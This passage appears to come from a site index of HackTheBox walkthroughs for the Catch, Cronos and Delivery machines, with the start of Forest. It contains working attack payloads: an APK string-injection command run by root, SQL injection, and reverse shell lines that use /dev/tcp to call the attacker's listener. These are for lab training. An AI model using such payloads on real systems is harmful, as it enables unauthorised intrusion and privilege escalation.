SameSite=Lax\n|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Sat, 28 May 2022 11:59:28 GMT\n|_    Content-Length: 0\n5000/tcp open  upnp?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: \n|     HTTP/1.1 400 Bad Request\n|     Connection: close\n|   GetRequest: \n|     HTTP/1.1 302 Found\n|     X-Frame-Options: SAMEORIGIN\n|     X-Download-Options: noopen\n|     X-Content-Type-Options: nosniff\n|     X-XSS-Protection: 1; mode=block\n|     Content-Security-Policy: \n|     X-Content-Security-Policy: \n|     X-WebKit-CSP: \n|     X-UA-Compatible: IE=Edge,chrome=1\n|     Location: /login\n|     Vary: Accept, Accept-Encoding\n|     Content-Type: text/plain; charset=utf-8\n|     Content-Length: 28\n|     Set-Cookie: connect.sid=s%3ArAhYISOfSycRtXXcLkE076Nl3IxV2VTK.5N2ujOCd1eowvNHpT3UQ092ovNFzOOPCNlGrJlhHrO4; Path=/; HttpOnly\n|     Date: Sat, 28 May 2022 11:59:28 GMT\n|     Connection: close\n|     Found. Redirecting to /login\n|   HTTPOptions: \n|     HTTP/1.1 200 OK\n|     X-Frame-Options: SAMEORIGIN\n|     X-Download-Options: noopen\n|     X-Content-Type-Options: nosniff\n|     X-XSS-Protection: 1; mode=block\n|     Content-Security-Policy: \n|     X-Content-Security-Policy: \n|     X-WebKit-CSP: \n|     X-UA-Compatible: IE=Edge,chrome=1\n|     Allow: GET,HEAD\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 8\n|     ETag: W/\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\"\n|     Set-Cookie: connect.sid=s%3A6AA6bymAmMLNna6EYRKbWFqnMLzxhZ1n.oO7hR8xgJuWTWkFrTeGrzVkLz2PlomVDrsyS4C8KJV0; Path=/; HttpOnly\n|     Vary: Accept-Encoding\n|     Date: Sat, 28 May 2022 11:59:28 GMT\n|     Connection: close\n|_    GET,HEAD\n8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Catch Global Systems\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 95.06 seconds\n</code></pre> <p>Looks like Nmap was not able to report some of the ports services properly so, since everything but the port 22 seems like HTTP services I checked all of them:</p> <ul> <li>Port 22: SSH, this is the obvious one</li> <li>Port 80: Catch webpage.</li> <li>Port 3000: Catch repositories.</li> <li>Port 5000: Let's Chat page.</li> <li>Port 8000: Catch status page.</li> </ul>"},{"location":"HackTheBox/Catch/#catch-webpage","title":"Catch Webpage","text":"<p>This site is pretty empty, I even tried to launch a Gobuster scan but couldn't really find anything. The only thing here is that we can download what looks like the status page app for Android, I will decode the APK file and inspect the code later to see if there is something interesting.</p>"},{"location":"HackTheBox/Catch/#catch-repositories","title":"Catch Repositories","text":"<p>Here we have what looks like a self hosted Git service called Gitea. The version is 1.14.1 and it has no public repositories but I found that the user <code>root</code> exists, maybe we can try to bruteforce or wait until we find some credentials.</p>"},{"location":"HackTheBox/Catch/#lets-chat","title":"Let's Chat","text":"<p>This is a (Let's Chat)[https://github.com/sdelements/lets-chat] application, I have no credentials to try here so I guess we finished before starting.</p>"},{"location":"HackTheBox/Catch/#catch-status-page","title":"Catch Status Page","text":"<p>This is a Cachet application, and it is used to show the status of services. According to the documentation there is a login page: <code>/auth/login</code>, in order to find the credentials we could try to decode the APK file we got before (Remember that should be this same page but for Android) and inspect it a bit:</p> <pre><code>apktool d catchv1.0.apk\n</code></pre> <p>After looking around for a bit I found these tokens under <code>res/values/strings.xml</code>:</p> <pre><code>res/values/strings.xml\n\n&lt;string name=\"gitea_token\"&gt;b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0&lt;/string&gt;\n&lt;string name=\"slack_token\"&gt;xoxp-23984754863-2348975623103&lt;/string&gt;\n&lt;string name=\"lets_chat_token\"&gt;NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&lt;/string&gt;\n</code></pre>"},{"location":"HackTheBox/Catch/#leaking-credentials-from-lets-chat","title":"Leaking credentials from Let's Chat","text":"<p>I tried both the Slack and Gitea tokens but looks like they are not valid. Luckily, the Let's Chat token worked! And now we can access the app API:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl -X 'GET' \\\n  'http://gitea.catch.htb:5000/rooms' \\\n  -H 'accept: application/json' -H 'Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' | jq\n[\n  {\n    \"id\": \"61b86b28d984e2451036eb17\",\n    \"slug\": \"status\",\n    \"name\": \"Status\",\n    \"description\": \"Cachet Updates and Maintenance\",\n    \"lastActive\": \"2021-12-14T10:34:20.749Z\",\n    \"created\": \"2021-12-14T10:00:08.384Z\",\n    \"owner\": \"61b86aead984e2451036eb16\",\n    \"private\": false,\n    \"hasPassword\": false,\n    \"participants\": []\n  },\n  {\n    \"id\": \"61b8708efe190b466d476bfb\",\n    \"slug\": \"android_dev\",\n    \"name\": \"Android Development\",\n    \"description\": \"Android App Updates, Issues &amp; More\",\n    \"lastActive\": \"2021-12-14T10:24:21.145Z\",\n    \"created\": \"2021-12-14T10:23:10.474Z\",\n    \"owner\": \"61b86aead984e2451036eb16\",\n    \"private\": false,\n    \"hasPassword\": false,\n    \"participants\": []\n  },\n  {\n    \"id\": \"61b86b3fd984e2451036eb18\",\n    \"slug\": \"employees\",\n    \"name\": \"Employees\",\n    \"description\": \"New Joinees, Org updates\",\n    \"lastActive\": \"2021-12-14T10:18:04.710Z\",\n    \"created\": \"2021-12-14T10:00:31.043Z\",\n    \"owner\": \"61b86aead984e2451036eb16\",\n    \"private\": false,\n    \"hasPassword\": false,\n    \"participants\": []\n  }\n]\n</code></pre> <p>After inspecting the different chats I found credentials for the Status page!</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl -X 'GET' \\\n  'http://gitea.catch.htb:5000/rooms/61b86b28d984e2451036eb17/messages' \\\n  -H 'accept: application/json' -H 'Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' | jq\n[\n  ...\n  {\n    \"id\": \"61b8702dfe190b466d476bfa\",\n    \"text\": \"Here are the credentials `john :  E}V!mywu_69T4C}W`\",\n    \"posted\": \"2021-12-14T10:21:33.859Z\",\n    \"owner\": \"61b86f15fe190b466d476bf5\",\n    \"room\": \"61b86b28d984e2451036eb17\"\n  },\n  ...\n]\n</code></pre>"},{"location":"HackTheBox/Catch/#getting-user-access","title":"Getting user access","text":"<p>Using <code>john:E}V!mywu_69T4C}W</code> as credentials in the Cached dashboard gives us access to it. Once in here I really had a hard time figuring out what to do next, I found this blog where they show 3 different CVEs for Cachet <code>2.4.0-dev</code>. In theory all of them can be used but the RCE one (The more interesting of them of course) is pretty tricky so I tried the CVE-2021-39174.</p> <p>This vulnerability tale advantage of the fact that the application uses <code>vlucas/phpdotenv</code> for the configuration files and it support nested variables. The problem with this is that any user with access to the dashboard can leak configuration variables, it just need to go to the mail settings and change the <code>Mail From Address</code> field from <code>notify@10.129.136.74</code> to, for example, <code>notify.{DB_PASSWORD}.@10.129.136.74</code>. When the page is reloaded, the application will load the variable value and leak the information. Checking the documentation I leaked <code>DB_PASSWORD</code> and <code>DB_USERNAME</code>: <code>will:s2#4Fg0_%3!</code>.</p> <p>I decided to try this credentials in the other services and imagine my surprise when I got SSH access, we are in!</p>"},{"location":"HackTheBox/Catch/#in-the-machine-as-will","title":"In the machine as will","text":"<p>You can get the user flag under <code>/home/will/user.txt</code>. After that, I found something interesting: <code>/opt/mdm/verify.sh</code>. Looks like this is running as a cronjob or something by <code>root</code> and it is checking <code>.apk</code> files under <code>/opt/mdm/apk_bin/</code> to see if they are valid Catch applications.</p> <p>Since we already have an APK that should be valid, the one we downloaded at the beginning, we can upload it to the machine and see what happens with it. After a minute or so, the APK file I put in the path checked by the script was deleted. Checking the script, that is actually the last step so we are now sure about the cronjob theory.</p>"},{"location":"HackTheBox/Catch/#getting-root","title":"Getting root","text":"<p>Inside the script I noticed this function:</p> <pre><code>####################\n# Basic App Checks #\n####################\n\napp_check() {\n    APP_NAME=$(grep -oPm1 \"(?&lt;=&lt;string name=\\\"app_name\\\"&gt;)[^&lt;]+\" \"$1/res/values/strings.xml\")\n    echo $APP_NAME\n    if [[ $APP_NAME == *\"Catch\"* ]]; then\n        echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'\n        mv \"$3/$APK_NAME\" \"$2/$APP_NAME/$4\"\n    else\n        echo \"[!] App doesn't belong to Catch Global\"\n        cleanup\n        exit\n    fi\n}\n</code></pre> <p>It is using <code>xargs</code> to generate a command that will create directory with a name of the application. The name of the application is obtained, after decompiling the APK, from a file called <code>strings.xml</code>. This is actually the file where we found the application tokens earlier.</p> <p>Since we can edit this file, it is possible to change the variable name the script is using and inject a command that will be run by <code>root</code>:</p> <pre><code>    ...\n    &lt;string name=\"abc_toolbar_collapse_description\"&gt;Collapse&lt;/string&gt;\n    &lt;string name=\"app_name\"&gt;Catch;chmod u+s /bin/bash&lt;/string&gt;\n    &lt;string name=\"appbar_scrolling_view_behavior\"&gt;\n    ...\n</code></pre> <p>In this case, the idea is that the <code>bash</code> binary will be turned into a SUID binary to allow us to get <code>root</code> access easily. Just recompile the new APK with <code>apktool b catchv1.0</code> and upload the application to the <code>/opt/mdm/apk_bin/</code> folder in the target.</p> <p>After waiting a bit, the APK file gets removed and...</p> <pre><code>will@catch:~$ bash -p\nbash-5.0#\n</code></pre> <p>We have rooted it! Get the flag under <code>/root/root.txt</code>.</p>"},{"location":"HackTheBox/Cronos/","title":"Cronos","text":""},{"location":"HackTheBox/Cronos/#nmap-scan","title":"Nmap scan","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate 1000 -v 10.10.10.13\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-01-07 11:28 EST\nNmap scan report for 10.10.10.13\nHost is up (0.037s latency).\nNot shown: 65532 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n53/tcp open  domain\n80/tcp open  http\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 102.81 seconds\n           Raw packets sent: 131150 (5.771MB) | Rcvd: 83 (3.636KB)\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Cronos]\n\u2514\u2500$ sudo nmap -sC -sV -p22,53,80 10.10.10.13\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-01-07 11:31 EST\nNmap scan report for 10.10.10.13\nHost is up (0.037s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)\n|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)\n|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)\n53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)\n| dns-nsid: \n|_  bind.version: 9.10.3-P4-Ubuntu\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Apache2 Ubuntu Default Page: It works\n|_http-server-header: Apache/2.4.18 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.13 seconds\n</code></pre> <p>We have only three ports open, SSH, DNS and a web server. Looks like it is an Ubuntu 16 machine and the only service version that looks a bit outdated is the DNS server one.</p>"},{"location":"HackTheBox/Cronos/#port-80","title":"Port 80","text":""},{"location":"HackTheBox/Cronos/#nothing","title":"Nothing?","text":"<p>Since the web server only shows the default Apache page we can go ahead and try Gobuster: <pre><code>===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.13\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/01/07 11:41:23 Starting gobuster in directory enumeration mode\n===============================================================\n/server-status        (Status: 403) [Size: 299]\n\n===============================================================\n2022/01/07 11:55:23 Finished\n===============================================================\n</code></pre> Cool, is empty or at least looks like so. </p>"},{"location":"HackTheBox/Cronos/#enumerating-the-domains","title":"Enumerating the domains","text":"<p>Maybe there are virtual hosts in place so let's check the DNS server: <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Cronos]\n\u2514\u2500$ nslookup         \n&gt; SERVER 10.10.10.13\nDefault server: 10.10.10.13\nAddress: 10.10.10.13#53\n&gt; 127.0.0.1\n1.0.0.127.in-addr.arpa  name = localhost.\n&gt; 10.10.10.13\n13.10.10.10.in-addr.arpa    name = ns1.cronos.htb.\n&gt;\n</code></pre> Adding <code>cronos.htb</code> to my hosts file and visiting the page again using this domain reveals a new page called cronos.</p> <p>This is nice but before going any further let's try to perform a zone transfer to check if there are subdomains: <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Cronos]\n\u2514\u2500$ dig axfr @10.10.10.13 cronos.htb\n\n; &lt;&lt;&gt;&gt; DiG 9.17.19-3-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.13 cronos.htb\n; (1 server found)\n;; global options: +cmd\ncronos.htb.     604800  IN  SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800\ncronos.htb.     604800  IN  NS  ns1.cronos.htb.\ncronos.htb.     604800  IN  A   10.10.10.13\nadmin.cronos.htb.   604800  IN  A   10.10.10.13\nns1.cronos.htb.     604800  IN  A   10.10.10.13\nwww.cronos.htb.     604800  IN  A   10.10.10.13\ncronos.htb.     604800  IN  SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800\n;; Query time: 40 msec\n;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)\n;; WHEN: Fri Jan 07 12:18:35 EST 2022\n;; XFR size: 7 records (messages 1, bytes 203)\n</code></pre> There they are, let's add <code>admin.cronos.htb</code> and <code>www.cronos.htb</code> to the hosts file too.</p>"},{"location":"HackTheBox/Cronos/#cronoshtb-and-wwwcronoshtb","title":"<code>cronos.htb</code> and <code>www.cronos.htb</code>","text":"<p>This two domains show the Cronos page. After looking around a bit nothing interesting here, time to move on.</p>"},{"location":"HackTheBox/Cronos/#admincronoshtb","title":"<code>admin.cronos.htb</code>","text":"<p>In this case we are welcomed by a login form. Trying some typical credentials didn't work but since the page looks hand made maybe SQL injection is our way in.</p> <p>Using the typical <code>' OR 1=1 #</code> as the user and the password worked! We have access now to something called <code>Net Tool v0.1</code>.</p>"},{"location":"HackTheBox/Cronos/#rce-and-reverse-shell","title":"RCE and reverse shell","text":"<p>This <code>Net Tool v0.1</code> allow the user to execute the commands <code>ping</code> and <code>traceroute</code> from the browser. The thing is that the input is not sanitize so if we enter something like <code>; cat /etc/passwd</code> the application prints the <code>/etc/passwd</code>. We have RCE!</p> <p>Time to get a reverse shell, this simple payload will do: <code>; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.28/8080 0&gt;&amp;1'</code>.</p>"},{"location":"HackTheBox/Cronos/#in-the-box-as-www-data","title":"In the box as <code>www-data</code>","text":"<p>After stabilizing the shell is time to search for a privilege scalation vector. First of all, there is a file called <code>config.php</code> with the database credentials: <code>admin:kEjdbRigfBHUREiNSDs</code> that can be used to retrieve the hashed admin password of the page: <code>admin:4f5fffa7b2340178a716e3832451e058</code>.</p> <p>We can get the users that can login to the system to try the credentials we have: <pre><code>www-data@cronos:/var/www/laravel/config$ cat /etc/passwd | grep sh$\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/bin/bash\nnoulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash\n</code></pre> But sadly this didn't work. At least we can get the user flag under <code>/home/noulis/user.txt</code>.</p>"},{"location":"HackTheBox/Cronos/#getting-root","title":"Getting root","text":"<p>After looking a bit around I found something: <pre><code>www-data@cronos:/$ cat /etc/crontab \n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )\n* * * * *   root    php /var/www/laravel/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1\n#\n</code></pre> <code>cron</code> is executing a script every minute as the <code>root</code> user. We can edit that script so adding: <pre><code>system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.28/8000 0&gt;&amp;1'\");\n</code></pre> And spinning up a listener will give us a reverse shell as <code>root</code>. The flag is under <code>/root/root.txt</code>.</p>"},{"location":"HackTheBox/Delivery/","title":"Delivery","text":""},{"location":"HackTheBox/Delivery/#nmap","title":"Nmap","text":"<p>Looks like there are two web servers running in the machine, I will start checking port 80 first and then we can go with the 8065. I know SSH is there but since I have no credentials and the version is not too old let's move on for now.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate=1000 10.10.10.222\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-02-01 18:04 CET\nNmap scan report for 10.10.10.222\nHost is up (0.048s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8065/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 19.39 seconds\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p22,80,8065 -sC -sV 10.10.10.222\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-02-01 18:06 CET\nNmap scan report for helpdesk.delivery.htb (10.10.10.222)\nHost is up (0.041s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 9c40fa859b01acac0ebc0c19518aee27 (RSA)\n|   256 5a0cc03b9b76552e6ec4f4b95d761709 (ECDSA)\n|_  256 b79df7489da2f27630fd42d3353a808c (ED25519)\n80/tcp   open  http    nginx 1.14.2\n|_http-title: delivery\n|_http-server-header: nginx/1.14.2\n8065/tcp open  unknown\n| fingerprint-strings: \n|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 200 OK\n|     Accept-Ranges: bytes\n|     Cache-Control: no-cache, max-age=31556926, public\n|     Content-Length: 3108\n|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com\n|     Content-Type: text/html; charset=utf-8\n|     Last-Modified: Wed, 01 Feb 2023 16:59:37 GMT\n|     X-Frame-Options: SAMEORIGIN\n|     X-Request-Id: sz4pfpnxf38t7j84ks8rsrhn8w\n|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false\n|     Date: Wed, 01 Feb 2023 17:06:38 GMT\n|     &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0\"&gt;&lt;meta name=\"robots\" content=\"noindex, nofollow\"&gt;&lt;meta name=\"referrer\" content=\"no-referrer\"&gt;&lt;title&gt;Mattermost&lt;/title&gt;&lt;meta name=\"mobile-web-app-capable\" content=\"yes\"&gt;&lt;meta name=\"application-name\" content=\"Mattermost\"&gt;&lt;meta name=\"format-detection\" content=\"telephone=no\"&gt;&lt;link re\n|   HTTPOptions: \n|     HTTP/1.0 405 Method Not Allowed\n|     Date: Wed, 01 Feb 2023 17:06:38 GMT\n|_    Content-Length: 0\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 94.44 seconds\n</code></pre>"},{"location":"HackTheBox/Delivery/#port-80","title":"Port 80","text":"<p>We have a pretty simple website http://delivery.htb/ (Remember to add the domain to your host file!) where the only interesting thing was a link to http://helpdesk.delivery.htb/. The virtual host is serving a Osticket application for ticketing, looks updated and the staff login in http://helpdesk.delivery.htb/scp/login.php is not accepting the default credentials so I guess that is time to keep going.</p>"},{"location":"HackTheBox/Delivery/#port-8065","title":"Port 8065","text":"<p>A Mattermost installation, again looks updated. I can register but I need to confirm my email, that is a problem because I'm not really able to get the email... or maybe I can. Well, the help desk application, when creating a ticket, provides a custom <code>@delivery.htb</code> email that we can use to send updates to the ticket thread.</p> <p>Since we have access to that thread, we could use that ticket email for Mattermost registration and get our confirmation email in the ticket thread! As you can see, we can now confirm our account:</p> <pre><code>---- Registration Successful ---- Please activate your email by going to: http://delivery.htb:8065/do_verify_email?token=zzsen61145xqsq68ya3k6wtipt9wnb5e9yxupcd9pkfmyoisaw3ngc7qwxw6tm6z&amp;email=9517485%40delivery.htb ) --------------------- You can sign in from: --------------------- Mattermost lets you share messages and files from your PC or phone, with instant search and archiving. For the best experience, download the apps for PC, Mac, iOS and Android from: https://mattermost.com/download/#mattermostApps ( https://mattermost.com/download/#mattermostApps\n</code></pre> <p>Cool, inside Mattermost I can join a team called <code>Internal</code>. There, I got credentials for SSH <code>maildeliverer:Youve_G0t_Mail!</code>.</p>"},{"location":"HackTheBox/Delivery/#in-the-box","title":"In the box","text":""},{"location":"HackTheBox/Delivery/#getting-some-hashes","title":"Getting some hashes","text":"<p>After an initial enumeration trying to find low hanging fruits, I decided to look into the MySQL database that is running in the system. For that, we can just go to the Mattermost configuration directory and get the credentials for it. Fun fact, the password to access the database is actually a hint for the next step.</p> <pre><code>maildeliverer@Delivery:/var/www/osticket$ netstat -ltpn\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      -                   \ntcp6       0      0 :::80                   :::*                    LISTEN      -                   \ntcp6       0      0 :::22                   :::*                    LISTEN      -                   \ntcp6       0      0 ::1:631                 :::*                    LISTEN      -                   \ntcp6       0      0 :::8065                 :::*                    LISTEN      - \n\n\nmaildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep mysql -A 10\n        \"DriverName\": \"mysql\",\n     --&gt;\"DataSource\": \"mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s\",\n        \"DataSourceReplicas\": [],\n        \"DataSourceSearchReplicas\": [],\n        \"MaxIdleConns\": 20,\n        \"ConnMaxLifetimeMilliseconds\": 3600000,\n        \"MaxOpenConns\": 300,\n        \"Trace\": false,\n        \"AtRestEncryptKey\": \"n5uax3d4f919obtsp1pw1k5xetq1enez\",\n        \"QueryTimeout\": 30,\n        \"DisableDatabaseSearch\": false\n</code></pre> <p>Inside MySQL, I searched for the Mattermost user table and looks like there is a user called <code>root</code> registered. If that is the same <code>root</code> as in the system and we can crack the password we win!</p> <pre><code>MariaDB [mattermost]&gt; select Username,Password from Users;\n+----------------------------------+--------------------------------------------------------------+\n| Username                         | Password                                                     |\n+----------------------------------+--------------------------------------------------------------+\n|...                                                                                              |\n| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |\n|...                                                                                              |\n+----------------------------------+--------------------------------------------------------------+\n</code></pre>"},{"location":"HackTheBox/Delivery/#pwned","title":"Pwned!","text":"<p>The Rockyou dictionary failed to crack the password but in the Mattermost chat, there is a comment about not using passwords like: <code>PleaseSubscribe!</code> or variants of it. Maybe, using some rules and that password could be enough to crack it.</p> <p>After some try and error, I was able to crack the hash using Hashcat and the rule called <code>rockyou-30000.rule</code>. The password is <code>PleaseSubscribe!21</code> and we can use it to escalate to <code>root</code>!</p>"},{"location":"HackTheBox/Forest/","title":"Forest","text":""},{"location":"HackTheBox/Forest/#nmap","title":"Nmap","text":"<p>Let's start as always scanning the box to see what we can do.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap --min-rate 1500 -p- -Pn 10.10.10.161\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-23 09:44 EST\nNmap scan report for 10.10.10.161\nHost is up (0.044s latency).\nNot shown: 65512 closed tcp ports (reset)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49671/tcp open  unknown\n49676/tcp open  unknown\n49677/tcp open  unknown\n49684/tcp open  unknown\n49703/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 27.53 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Forest]\n\u2514\u2500$ sudo nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.10.161\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-23 09:47 EST\nNmap scan report for 10.10.10.161\nHost is up (0.048s latency).\n\nPORT      STATE SERVICE      VERSION\n53/tcp    open  domain?\n88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-11-23 14:54:46Z)\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf       .NET Message Framing\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled and required\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: FOREST\n|   NetBIOS computer name: FOREST\\x00\n|   Domain name: htb.local\n|   Forest name: htb.local\n|   FQDN: FOREST.htb.local\n|_  System time: 2022-11-23T06:57:06-08:00\n|_clock-skew: mean: 2h46m52s, deviation: 4h37m08s, median: 6m51s\n| smb2-time: \n|   date: 2022-11-23T14:57:05\n|_  start_date: 2022-11-23T14:50:32\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 161.21 seconds\n</code></pre> <p>Looks like a domain controller, I will start by checking the SMB and MSRPC services and then I will jump to AD / 